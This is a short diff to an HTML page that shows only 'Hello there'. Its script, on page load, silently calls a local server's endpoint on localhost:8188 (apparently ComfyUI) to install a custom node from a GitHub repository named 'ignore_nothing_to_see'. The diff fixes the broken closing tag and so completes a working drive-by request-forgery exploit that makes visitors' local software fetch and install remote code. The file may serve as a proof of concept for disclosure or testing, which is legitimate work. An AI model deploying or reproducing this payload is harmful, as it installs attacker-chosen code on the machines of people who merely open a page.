@@ -5,6 +5,7 @@
     <body>
         Hello there
         <script>
+            console.log("Hello from the script");
             fetch("http://localhost:8188/customnode/install/git_url?url=https://github.com/vivax3794/ignore_nothing_to_see.git", {
     "credentials": "omit",
     "headers": {
@@ -22,7 +23,7 @@
     "referrer": "http://localhost:8188/",
     "method": "GET",
     "mode": "cors"
-});
-        <script>
+}).then(response => response.json()).then(data => console.log(data));
+        </script>
     </body>
 </html>
